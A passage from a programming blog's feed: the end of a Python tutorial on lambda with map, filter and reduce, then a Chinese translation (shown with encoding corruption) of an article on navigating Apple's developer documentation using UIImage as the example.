class="code"><pre><span class="line">a  = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x * <span class="number">2</span> , a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½†æ˜¯ï¼Œå°è¯•ä½¿ç”¨åˆ—è¡¨æ¨å¯¼</span></span><br><span class="line"><span class="comment"># å¦‚æœä½ å·²ç»å®šä¹‰äº†å‡½æ•°ï¼Œè¯·ä½¿ç”¨ map</span></span><br><span class="line">c = [x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>]</span><br></pre></td></tr></table></figure><h3><span id="zai-filter-han-shu-zhong-shi-yong-lambda-han-shu">åœ¨ filter å‡½æ•°ä¸­ä½¿ç”¨ Lambda å‡½æ•°</span></h3><p><code>filter(func, seq)</code> ï¼Œè¿”å›å…¶ <code>func</code> è®¡ç®—ä¸º <code>True</code> çš„æ‰€æœ‰å…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: (x%<span class="number">2</span> == <span class="number">0</span>) , a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ ·å¯ä»¥ä½¿ç”¨åˆ—è¡¨æ¨å¯¼å®ç°</span></span><br><span class="line">c = [x <span class="keyword">for</span> x <span class="keyword">in</span> a <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure><h3><span id="reduce">reduce</span></h3><p><code>reduce(func, seq)</code> ï¼Œé‡å¤å°† <code>func</code> åº”ç”¨äºå…ƒç´ å¹¶è¿”å›å•ä¸ªå€¼ã€‚<code>func</code> éœ€è¦2ä¸ªå‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">product_a = reduce(<span class="keyword">lambda</span> x, y: x*y, a)</span><br><span class="line"><span class="built_in">print</span>(product_a)</span><br><span class="line">sum_a = reduce(<span class="keyword">lambda</span> x, y: x+y, a)</span><br><span class="line"><span class="built_in">print</span>(sum_a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">24</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      08. Lambda å‡½æ•° â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•é˜…è¯»è‹¹æœå¼€å‘æ–‡æ¡£</title>
    <link href="https://qiwihui.com/qiwihui-blog-46/"/>
    <id>https://qiwihui.com/qiwihui-blog-46/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/3297411/51306754-16f48780-1a79-11e9-9959-b6f94a4cae45.jpg" alt="coding-woman-5"></p><p>åŸæ–‡ï¼š<a href="https://www.hackingwithswift.com/articles/167/how-to-read-apples-developer-documentation">How to read Appleâ€™s developer documentation</a></p><p>å¯¹äºå¾ˆå¤šäººæ¥è¯´ï¼Œè¿™ç¯‡æ–‡ç« å¬èµ·æ¥å¾ˆå¥‡æ€ªï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ä¹ æƒ¯äº† Apple çš„ API æ–‡æ¡£çš„å·¥ä½œæ–¹å¼ï¼Œå› æ­¤æˆ‘ä»¬ç²¾ç¥ä¸Šå·²ç»ç»è¿‡è°ƒæ•´ä»¥å¿«é€Ÿæ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p>ä½†è¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„äº‹å®ï¼šå»å¹´æˆ‘æœ€çƒ­é—¨çš„æ–‡ç« è¯·æ±‚ä¹‹ä¸€æ˜¯å¸®åŠ©äººä»¬çœŸæ­£é˜…è¯» Apple çš„ä»£ç æ–‡æ¡£ã€‚æ‚¨å¦‚ä½•æ‰¾åˆ°æ‚¨éœ€è¦çš„ iOS APIï¼Œå¦‚ä½•æµè§ˆæ‰€æœ‰ææ–™ä»¥æ‰¾åˆ°æ‚¨çœŸæ­£æƒ³è¦çš„å†…å®¹ï¼Œä»¥åŠæ‚¨å¦‚ä½•æ·±å…¥äº†è§£ä¸ºä»€ä¹ˆäº‹æƒ…æŒ‰ç…§ä»–ä»¬çš„æ–¹å¼å·¥ä½œï¼Ÿ</p><p>æ‰€ä»¥ï¼Œå¦‚æœä½ æ›¾ç»å¯»æ±‚å¸®åŠ©æ¥ç†è§£ Apple çš„å¼€å‘è€…æ–‡æ¡£ï¼Œé¦–å…ˆæˆ‘è¦è®©ä½ çŸ¥é“ä½ å¹¶ä¸å­¤å• - è®¸å¤šäººéƒ½åœ¨åŠªåŠ›è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä½†å…¶æ¬¡ï¼Œæˆ‘å¸Œæœ›è¿™ç¯‡æ–‡ç« ä¼šæœ‰æ‰€å¸®åŠ©ï¼šæˆ‘ä¼šå°½åŠ›è§£é‡Šå®ƒçš„ç»“æ„ï¼Œå®ƒæœ‰ä»€ä¹ˆå¥½å¤„ï¼ˆä»¥åŠä¸å¥½çš„åœ°æ–¹ï¼‰ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒã€‚</p><p>æ›´é‡è¦çš„æ˜¯ï¼Œæˆ‘å°†å‘æ‚¨å±•ç¤ºç»éªŒä¸°å¯Œçš„å¼€å‘äººå‘˜å¯»æ‰¾é¢å¤–ä¿¡æ¯çš„ä½ç½®ï¼Œè¿™äº›ä¿¡æ¯é€šå¸¸æ¯”Appleçš„åœ¨çº¿æ–‡æ¡£æ›´æœ‰ä»·å€¼ã€‚</p><span id="more"></span><h2><span id="zhe-shi-shi-me-vs-ni-zen-me-yong-ta">â€œè¿™æ˜¯ä»€ä¹ˆï¼Ÿâ€ vs â€œä½ æ€ä¹ˆç”¨å®ƒï¼Ÿâ€</span></h2><p>ä»»ä½•ä¹¦é¢çš„ API æ–‡æ¡£é€šå¸¸é‡‡ç”¨ä»¥ä¸‹äº”ç§å½¢å¼ä¹‹ä¸€ï¼š</p><ol><li>æ¥å£ä»£ç ï¼Œæ˜¾ç¤ºäº†ä»€ä¹ˆæ˜¯æ–¹æ³•åç§°å’Œå‚æ•°ï¼Œå±æ€§åç§°å’Œç±»å‹ï¼Œä»¥åŠç±»ä¼¼çš„ï¼Œå¸¦æœ‰ä¸€äº›æè¿°å®ƒåº”è¯¥åšä»€ä¹ˆçš„æ–‡æœ¬ã€‚</li><li>API çš„æ–‡æœ¬æè¿°äº†å®ƒåº”è¯¥åšä»€ä¹ˆä»¥åŠä¸€èˆ¬æŒ‡å¯¼ç”¨ä¾‹ã€‚</li><li>å¹¿æ³›ä½¿ç”¨çš„æœ‰ç”¨çš„ API ç¤ºä¾‹ä»£ç ã€‚</li><li>å¦‚ä½•ä½¿ç”¨ API ä»£ç æ®µã€‚</li><li>è§£å†³å¸¸è§é—®é¢˜çš„ç®€å•æ•™ç¨‹ï¼šå¦‚ä½•åš Xï¼Œå¦‚ä½•åš Yï¼Œä»¥åŠå¦‚ä½•åš Z ç­‰ç­‰ã€‚</li></ol><p>ç²—ç•¥åœ°è¯´ï¼Œè‹¹æœå…¬å¸ç¬¬ä¸€ç‚¹åšäº†å¾ˆå¤šï¼Œå…¶æ¬¡æ˜¯ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹ï¼Œç¬¬å››ç‚¹å¾ˆå°‘ï¼Œç¬¬äº”ç‚¹å‡ ä¹æ²¡æœ‰ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœä½ æ­£åœ¨å¯»æ‰¾â€œå¦‚ä½•ç”¨ Y åš X â€çš„å…·ä½“ä¾‹å­ï¼Œä½ æœ€å¥½ä»æˆ‘çš„ <a href="https://www.hackingwithswift.com/example-code">Swift çŸ¥è¯†åº“</a>å¼€å§‹ - è¿™æ­£æ˜¯å®ƒçš„ç”¨é€”ã€‚</p><p>äº†è§£ Apple çš„æ–‡æ¡£è§£å†³çš„é—®é¢˜ï¼Œå¯ä»¥å¸®åŠ©æ‚¨ä»ä¸­è·å¾—æœ€å¤§æ”¶ç›Šã€‚å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªç»“æ„åŒ–çš„æ•™ç¨‹ï¼Œå®ƒä¸ä¼šå‘æ‚¨ä»‹ç»ä¸€ç³»åˆ—æ¦‚å¿µæ¥å¸®åŠ©æ‚¨å®ç°ç›®æ ‡ï¼Œè€Œæ˜¯ä½œä¸º Apple æ”¯æŒçš„æ•°åƒä¸ª API çš„å‚è€ƒæŒ‡å—ã€‚</p><h2><span id="xun-zhao-yi-ge-lei">å¯»æ‰¾ä¸€ä¸ªç±»</span></h2><p>Appleçš„åœ¨çº¿æ–‡æ¡£ä½äº <a href="https://developer.apple.com/documentation/">https://developer.apple.com/documentation/</a> ï¼Œè™½ç„¶æ‚¨èƒ½åœ¨ Xcode ä¸­ä½¿ç”¨æœ¬åœ°å‰¯æœ¬ï¼Œä½†æˆ‘ä¼šè¯´å¤§å¤šæ•°äººä½¿ç”¨åœ¨çº¿ç‰ˆæœ¬åªæ˜¯å› ä¸ºä»–ä»¬å¯ä»¥æ›´å®¹æ˜“åœ°æ‰¾åˆ°å†…å®¹ã€‚</p><p>ç»å¤§å¤šæ•° Apple çš„æ–‡æ¡£éƒ½æè¿°äº†æ¥å£ï¼Œè€Œè¿™æ­£æ˜¯å¤§å¤šæ•°æ—¶å€™ä½ ä¼šçœ‹åˆ°çš„ã€‚æˆ‘æƒ³ä½¿ç”¨ä¸€ä¸ªå®é™…çš„ä¾‹å­ï¼Œæ‰€ä»¥è¯·å…ˆåœ¨æ‚¨çš„ç½‘ç»œæµè§ˆå™¨ä¸­æ‰“å¼€https://developer.apple.com/documentation/ ï¼Œè¿™æ˜¯æ‰€æœ‰Appleå¼€å‘è€…æ–‡æ¡£çš„ä¸»é¡µã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51331392-9f444e00-1ab4-11e9-94df-48407c8102c3.png" alt="apple-developer-documentation"></p><p>æ‚¨ä¼šçœ‹åˆ°æ‰€æœ‰ Apple çš„ API åˆ†ä¸º <code>App Frameworks</code> æˆ– <code>Graphics and Games</code> ç­‰ç±»åˆ«ï¼Œæ‚¨å·²ç»çœ‹åˆ°äº†ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼šæ‰€æœ‰æ·±è“è‰²æ–‡æœ¬éƒ½æ˜¯å¯ç‚¹å‡»çš„ï¼Œå¹¶ä¼šå¸¦æ‚¨è¿›å…¥ç‰¹å®šæ¡†æ¶çš„APIæ–‡æ¡£ã€‚æ˜¯çš„ï¼Œå®ƒä½¿ç”¨ç›¸åŒçš„å­—ä½“å’Œå¤§å°ï¼Œæ²¡æœ‰ä¸‹åˆ’çº¿ï¼Œè¯´å®è¯ï¼Œæ·±è“è‰²é“¾æ¥å’Œé»‘è‰²æ–‡æœ¬ä¹‹é—´æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œä½†ä½ ä»ç„¶éœ€è¦ç•™æ„è¿™äº›é“¾æ¥ - æœ‰å¾ˆå¤šä»–ä»¬ï¼Œä½ ä¼šç”¨å®ƒä»¬æ¥æ·±å…¥æŒ–æ˜ä¸»é¢˜ã€‚</p><p>ç°åœ¨è¯·ä» <code>App Frameworks</code> ç±»åˆ«ä¸­é€‰æ‹© <code>UIKit</code>ï¼Œæ‚¨å°†çœ‹åˆ°å®ƒçš„åŠŸèƒ½ï¼ˆä¸ºiOSåˆ›å»ºç”¨æˆ·ç•Œé¢ï¼‰çš„ç®€è¦æ¦‚è¿°ï¼Œæ ‡æœ‰â€œ<code>é‡è¦</code>â€ï¼ˆ<code>Important</code>ï¼‰çš„å¤§é»„è‰²æ¡†ï¼Œç„¶åæ˜¯ç±»åˆ«åˆ—è¡¨ã€‚é‚£äº›é»„è‰²çš„ç›’å­ç¡®å®å€¼å¾—å…³æ³¨ï¼šè™½ç„¶å®ƒä»¬ç»å¸¸è¢«ä½¿ç”¨ï¼Œå®ƒä»¬å‡ ä¹æ€»èƒ½é˜»æ­¢ä½ çŠ¯ä¸‹æ ¹æœ¬é”™è¯¯ï¼Œè¿™äº›é”™è¯¯å¯¼è‡´å‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51331416-aa977980-1ab4-11e9-886a-9dc54dae0189.png" alt="uikit-overview"></p><p>æ­¤é¡µé¢ä¸Šé‡è¦çš„æ˜¯å…±åŒæè¿° <code>UIKit</code> çš„ç±»åˆ«åˆ—è¡¨ã€‚è¿™æ˜¯äººä»¬ç»å¸¸è¿·è·¯çš„åœ°æ–¹ï¼šä»–ä»¬æƒ³è¦äº†è§£åƒ <code>UIImage</code> è¿™æ ·çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä»–ä»¬å¿…é¡»ä»”ç»†æŸ¥çœ‹è¯¥åˆ—è¡¨ä»¥æ‰¾åˆ°å®ƒå¯èƒ½å‡ºç°çš„åˆé€‚ä½ç½®ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51331432-b4b97800-1ab4-11e9-8d70-de35c34d58d4.png" alt="uikit-topics"></p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šæŸ¥çœ‹â€œèµ„æºç®¡ç†â€ï¼ˆ<code>Resource Management</code>ï¼‰ï¼Œå› ä¸ºå®ƒçš„å‰¯æ ‡é¢˜â€œç®¡ç†å­˜å‚¨åœ¨ä¸»å¯æ‰§è¡Œæ–‡ä»¶ä¹‹å¤–çš„å›¾åƒï¼Œå­—ç¬¦ä¸²ï¼Œæ•…äº‹æ¿å’Œ nib æ–‡ä»¶â€å¬èµ·æ¥å¾ˆæœ‰å¸Œæœ›ã€‚ä½†æ˜¯ï¼Œæ‚¨ä¼šæ„Ÿåˆ°å¤±æœ› - æ‚¨éœ€è¦å‘ä¸‹æ»šåŠ¨åˆ° â€œå›¾åƒå’Œ PDFâ€ï¼ˆ<code>Images and PDF</code>ï¼‰éƒ¨åˆ†æ‰èƒ½æ‰¾åˆ° <code>UIImage</code>ã€‚</p><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘è°ˆè¿‡çš„å¤§å¤šæ•°äººåªæ˜¯ä½¿ç”¨è‡ªå·±å–œæ¬¢çš„æœç´¢å¼•æ“ã€‚ä»–ä»¬è¾“å…¥ä»–ä»¬å…³å¿ƒçš„ç±»ï¼Œå¹¶ä¸” - åªè¦å®ƒæœ‰â€œUIâ€ï¼Œâ€œSKâ€æˆ–ç±»ä¼¼çš„å‰ç¼€ - å®ƒå¯èƒ½æ˜¯ç¬¬ä¸€ä¸ªç»“æœã€‚</p><p>ä¸è¦è¯¯ä¼šæˆ‘çš„æ„æ€ï¼šæˆ‘çŸ¥é“è¿™ç§åšæ³•å¹¶ä¸ç†æƒ³ã€‚ä½†æ˜¯é¢å¯¹æœç´¢ä¸€ä¸ªç±»æˆ–è€…å» <a href="https://developer.apple.com/documentation/">https://developer.apple.com/documentation/</a> ï¼Œé€‰æ‹©ä¸€ä¸ªæ¡†æ¶ï¼Œé€‰æ‹©ä¸€ä¸ªç±»åˆ«ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªç±»ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯æ›´å¿«ã€‚</p><p>é‡è¦æç¤ºï¼šæ— è®ºæ‚¨é€‰æ‹©å“ªç§æ–¹æ³•ï¼Œæœ€ç»ˆéƒ½ä¼šåœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œæ‰€ä»¥åªåšæœ€é€‚åˆæ‚¨çš„æ–¹æ³•ã€‚ç°åœ¨ï¼Œè¯·æ‰¾åˆ°å¹¶é€‰æ‹© <code>UIImage</code>ã€‚</p><h2><span id="yue-du-lei-de-jie-kou">é˜…è¯»ç±»çš„æ¥å£</span></h2><p>ä¸€æ—¦é€‰æ‹©äº†æ‚¨å…³å¿ƒçš„ç±»ï¼Œè¯¥é¡µé¢å°±æœ‰å››ä¸ªä¸»è¦ç»„ä»¶ï¼šæ¦‚è¿°ï¼Œç‰ˆæœ¬æ‘˜è¦ï¼Œæ¥å£å’Œå…³ç³»ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51334152-32cc4d80-1aba-11e9-9748-3ffdab35aafc.png" alt="uiimage-overview"></p><p>æ¦‚è¿°æ˜¯â€œAPIçš„æ–‡æœ¬æè¿°ï¼Œæè¿°äº†å®ƒåº”è¯¥åšä»€ä¹ˆä»¥åŠä¸€èˆ¬æŒ‡å¯¼ç”¨ä¾‹â€ï¼Œæˆ‘ä¹‹å‰æåˆ°è¿‡ - æˆ‘è¦æ±‚ä½ é€‰æ‹© <code>UIImage</code>ï¼Œå› ä¸ºå®ƒæ˜¯æ–‡æœ¬æè¿°ä½•æ—¶è¿è¡Œè‰¯å¥½çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚</p><p>å½“å®ƒæ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„ç±»æ—¶ï¼Œç‰¹åˆ«æ˜¯å¦‚æœå®ƒåˆšåˆšæ¨å‡ºæ—¶ï¼Œæˆ‘é€šå¸¸ä¼šé˜…è¯»æ¦‚è¿°æ–‡æœ¬ã€‚ä½†æ˜¯å¯¹äºå…¶ä»–ä¸€åˆ‡ - æˆ‘ä¹‹å‰è‡³å°‘ä½¿ç”¨è¿‡ä¸€æ¬¡çš„ä»»ä½•ç±» - æˆ‘è·³è¿‡å®ƒå¹¶å°è¯•æ‰¾åˆ°æˆ‘æ‰€å¾—åˆ°çš„å…·ä½“ç»†èŠ‚ã€‚è¯·è®°ä½ï¼ŒApple æ–‡æ¡£ç¡®å®ä¸æ˜¯ä¸€ç§å­¦ä¹ å·¥å…·ï¼šå½“æ‚¨è€ƒè™‘åˆ°ç‰¹å®šç›®çš„æ—¶ï¼Œå®ƒæœ€æœ‰æ•ˆã€‚</p><p>å¦‚æœæ‚¨ä¸æ€»æ˜¯ä¸ºæ‰€é€‰ Apple å¹³å°çš„æœ€æ–°ç‰ˆæœ¬å¼€å‘ï¼Œåˆ™ç‰ˆæœ¬æ‘˜è¦ - é¡µé¢å³ä¾§çš„ä¾§æ  - éå¸¸é‡è¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†çœ‹åˆ° <code>iOS 2.0 +</code>ï¼Œ<code>tvOS 9.0+</code> å’Œ <code>watchOS 2.0+</code>ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬ä½•æ—¶ <code>UIImage</code> ç±»é¦–æ¬¡åœ¨è¿™ä¸‰ä¸ªæ“ä½œç³»ç»Ÿä¸Šå¯ç”¨ï¼Œå¹¶ä¸”å®ƒä»ç„¶å¯ç”¨ - å¦‚æœå®ƒå·²è¢«å¼ƒç”¨ï¼ˆä¸å†å¯ç”¨ï¼‰ä½ ä¼šçœ‹åˆ°åƒ <code>iOS 2.0-9.0</code> è¿™æ ·çš„ä¸œè¥¿ã€‚</p><p>æ­¤é¡µé¢ä¸Šçš„å®é™…å†…å®¹ - ä»¥åŠä½œä¸º Apple æ¡†æ¶ä¸­ç‰¹å®šç±»çš„ä¸»é¡µçš„æ‰€æœ‰é¡µé¢ - éƒ½åˆ—åœ¨â€œä¸»é¢˜â€æ ‡é¢˜ä¸‹ã€‚è¿™å°†åˆ—å‡ºè¯¥ç±»æ”¯æŒçš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå†æ¬¡åˆ†è§£ä¸ºä½¿ç”¨ç±»åˆ«ï¼šâ€œè·å–å›¾åƒæ•°æ®â€ï¼Œâ€œè·å–å›¾åƒå¤§å°å’Œæ¯”ä¾‹â€ç­‰ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51334198-44adf080-1aba-11e9-8d86-2eac5e0191d2.png" alt="uiimage-topics"></p><p>å¦‚æœæ‚¨é€‰æ‹©çš„ç±»å…·æœ‰ä»»ä½•è‡ªå®šä¹‰åˆå§‹åŒ–æ–¹æ³•ï¼Œåˆ™å§‹ç»ˆä¼šé¦–å…ˆæ˜¾ç¤ºå®ƒä»¬ã€‚ <code>UIImage</code> æœ‰å¾ˆå¤šè‡ªå®šä¹‰åˆå§‹åŒ–æ–¹æ³•ï¼Œä½ ä¼šçœ‹åˆ°å®ƒä»¬éƒ½è¢«åˆ—ä¸ºç­¾å - åªæ˜¯æè¿°å®ƒæ‰€æœŸæœ›çš„å‚æ•°çš„éƒ¨åˆ†ã€‚æ‰€ä»¥ï¼Œä½ ä¼šçœ‹åˆ°è¿™æ ·çš„ä»£ç ï¼š</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">init?</span>(<span class="params">named</span>: <span class="type">String</span>)</span><br><span class="line"><span class="keyword">init</span>(<span class="params">imageLiteralResourceName</span>: <span class="type">String</span>)</span><br></pre></td></tr></table></figure><p>**æç¤ºï¼š**å¦‚æœæ‚¨çœ‹åˆ° <code>Objective-C</code> ä»£ç ï¼Œè¯·ç¡®ä¿å°†è¯­è¨€æ›´æ”¹ä¸º <code>Swift</code>ã€‚æ‚¨å¯ä»¥åœ¨é¡µé¢çš„å³ä¸Šè§’æ‰§è¡Œæ­¤æ“ä½œï¼Œä¹Ÿå¯ä»¥åœ¨é‡è¦çš„ iOS æµ‹è¯•ç‰ˆå¼•å…¥æ›´æ”¹æ—¶å¯ç”¨ API æ›´æ”¹é€‰é¡¹ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51334211-4aa3d180-1aba-11e9-8d34-33f922b01733.png" alt="switch-swift"></p><p>è®°ä½ï¼Œåˆå§‹åŒ–æ–¹æ³•å†™æˆ <code>init?</code> è€Œä¸æ˜¯ <code>init</code> çš„æ˜¯å®¹æ˜“å‡ºé”™çš„ - å®ƒä»¬è¿”å›ä¸€ä¸ªå¯é€‰é¡¹ï¼Œä»¥ä¾¿åœ¨åˆå§‹åŒ–å¤±è´¥æ—¶å®ƒä»¬å¯ä»¥è¿”å› <code>nil</code>ã€‚</p><p>åœ¨åˆå§‹åŒ–å™¨çš„æ­£ä¸‹æ–¹ï¼Œæ‚¨æœ‰æ—¶ä¼šçœ‹åˆ°ä¸€äº›ç”¨äºåˆ›å»ºç±»çš„é«˜åº¦ä¸“ä¸šåŒ–å®ä¾‹çš„æ–¹æ³•ã€‚è¿™äº›ä¸æ˜¯ Swift æ„ä¹‰ä¸Šçš„åˆå§‹åŒ–å™¨ï¼Œä½†å®ƒä»¬ç¡®å®åˆ›å»ºäº†ç±»çš„å®ä¾‹ã€‚å¯¹äº <code>UIImage</code>ï¼Œä½ ä¼šçœ‹åˆ°è¿™æ ·çš„äº‹æƒ…ï¼š</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">func</span> <span class="title class_">animatedImageNamed</span>(<span class="title class_">String</span>, <span class="title class_">duration</span>: <span class="title class_">TimeInterval</span>) -&gt; <span class="title class_">UIImage</span>?</span><br></pre></td></tr></table></figure><p><code>class func</code> éƒ¨åˆ†æ„å‘³ç€ä½ å°†ä½¿ç”¨ <code>UIImage.animatedImageNamed()</code> æ–¹å¼è°ƒç”¨ã€‚</p><p>åœ¨åˆå§‹åŒ–ç¨‹åºä¹‹åï¼Œäº‹æƒ…å˜å¾—æœ‰ç‚¹ä¸é‚£ä¹ˆæœ‰æ¡ç†ï¼šä½ ä¼šå‘ç°å±æ€§æ–¹æ³•å’Œæšä¸¾è‡ªç”±æ··åˆåœ¨ä¸€èµ·ã€‚è™½ç„¶æ‚¨å¯ä»¥æ»šåŠ¨æŸ¥æ‰¾æ‚¨è¦æŸ¥æ‰¾çš„å†…å®¹ï¼Œä½†æˆ‘å¯ä»¥è®¤ä¸ºå¤§å¤šæ•°äººåªéœ€è¦ <code>Cmd + F</code> åœ¨é¡µé¢ä¸ŠæŸ¥æ‰¾æ–‡å­—å°±å¯ä»¥äº†ï¼</p><p>æœ‰ä¸‰ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ul><li>åµŒå¥—ç±»å‹ - ç±»ï¼Œç»“æ„å’Œæšä¸¾ - ä¸å±æ€§å’Œæ–¹æ³•ä¸€èµ·åˆ—å‡ºï¼Œè¿™éœ€è¦ä¸€ç‚¹æ—¶é—´ä¹ æƒ¯ã€‚ä¾‹å¦‚ï¼Œ<code>UIImage</code> åŒ…å«åµŒå¥—çš„æšä¸¾ <code>ResizingMode</code>ã€‚</li><li>ä»»ä½•å¸¦æœ‰ç›´çº¿ç©¿è¿‡çš„ä¸œè¥¿éƒ½æ˜¯ä¸æ¨èä½¿ç”¨çš„ã€‚è¿™æ„å‘³ç€ Apple æ‰“ç®—åœ¨æŸäº›æ—¶å€™å°†å…¶åˆ é™¤ï¼Œå› æ­¤æ‚¨ä¸åº”å°†å…¶ç”¨äºå°†æ¥çš„ä»£ç ï¼Œå¹¶å»ºè®®å¼€å§‹é‡å†™ä»»ä½•ç°æœ‰ä»£ç ã€‚ï¼ˆåœ¨å®è·µä¸­ï¼Œå¤§å¤šæ•°APIé•¿æœŸä»¥æ¥éƒ½è¢«â€œå¼ƒç”¨â€ - è®¸å¤šè®¸å¤šå¹´ã€‚ï¼‰</li><li>ä¸€äº›éå¸¸å¤æ‚çš„ç±» - ä¾‹å¦‚ï¼Œ<code>UIViewController</code> - ä¼šå°†é¢å¤–çš„æ–‡æ¡£é¡µé¢ä¸å…¶æ–¹æ³•å’Œå±æ€§æ··åˆåœ¨ä¸€èµ·ã€‚æŸ¥æ‰¾å®ƒä»¬æ—è¾¹çš„é¡µé¢å›¾æ ‡ï¼Œä»¥åŠä¸€ä¸ªç®€å•çš„è‹±æ–‡æ ‡é¢˜ï¼Œå¦‚â€œç›¸å¯¹äºå®‰å…¨åŒºåŸŸå®šä½å†…å®¹â€ï¼ˆ<code>Positioning Content Relative to the Safe Area</code>ï¼‰ã€‚</li></ul><p>åœ¨é¡µé¢çš„åº•éƒ¨ä½ ä¼šæ‰¾åˆ° <code>Relationships</code>ï¼Œå®ƒå‘Šè¯‰ä½ å®ƒç»§æ‰¿äº†å“ªä¸ªç±»ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹å®ƒç›´æ¥æ¥è‡ª <code>NSObject</code>ï¼‰ï¼Œä»¥åŠå®ƒç¬¦åˆçš„æ‰€æœ‰åè®®ã€‚å½“æ‚¨æŸ¥çœ‹ Swift ç±»å‹æ—¶ï¼Œæœ¬èŠ‚æ›´æœ‰ç”¨ï¼Œå…¶ä¸­åè®®å…³ç³»æ›´å¤æ‚ã€‚</p><h2><span id="yue-du-shu-xing-huo-fang-fa-ye-mian">é˜…è¯»å±æ€§æˆ–æ–¹æ³•é¡µé¢</span></h2><p>æ‚¨å·²ç»é€‰æ‹©äº†ä¸€ä¸ªæ¡†æ¶å’Œç±»ï¼Œç°åœ¨æ˜¯æ—¶å€™æŸ¥çœ‹ç‰¹å®šçš„å±æ€§æˆ–æ–¹æ³•äº†ã€‚æŸ¥æ‰¾å¹¶é€‰æ‹©æ­¤æ–¹æ³•ï¼š</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">func</span> <span class="title class_">animatedResizableImageNamed</span>(<span class="title class_">String</span>, <span class="title class_">capInsets</span>: <span class="title class_">UIEdgeInsets</span>, <span class="title class_">resizingMode</span>: <span class="title class_">UIImage</span>.<span class="title class_">ResizingMode</span>, <span class="title class_">duration</span>: <span class="title class_">TimeInterval</span>) -&gt; <span class="title 